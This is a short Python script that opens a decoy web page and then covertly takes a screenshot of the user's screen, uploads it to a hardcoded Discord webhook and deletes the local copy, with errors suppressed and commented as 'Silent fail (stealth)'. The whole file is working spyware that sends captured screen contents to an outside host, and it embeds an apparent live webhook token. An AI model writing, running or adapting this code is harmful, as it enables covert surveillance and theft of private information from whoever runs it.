import pyautogui
import requests
import webbrowser
import os
import time

# ====================== CONFIG ======================
WEBHOOK_URL = "https://discord.com/api/webhooks/1518715161706237974/7AJIzvP-guKdVfQmxBHyjSk8hUeOCywLpLn_ls2lECwJrwRjO-JKHig0COvRShhTcoe9" 
SITE_URL = "https://foot.wiki/TIKY2X"
# ====================================================

def take_and_send_screenshot():
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Save temporarily
        filename = f"screenshot_{int(time.time())}.png"
        temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), filename)
        
        screenshot.save(temp_path)
        
        # Send to Discord webhook
        with open(temp_path, "rb") as file:
            payload = {
                "content": "📸 **Screenshot Captured**"
            }
            files = {
                "file": (filename, file)
            }
            requests.post(WEBHOOK_URL, data=payload, files=files)
        
        # Delete the temp file
        os.remove(temp_path)
        
    except Exception:
        pass  # Silent fail (stealth)


if __name__ == "__main__":
    # Open the website first
    webbrowser.open(SITE_URL)
    
    # Take screenshot and send it
    take_and_send_screenshot()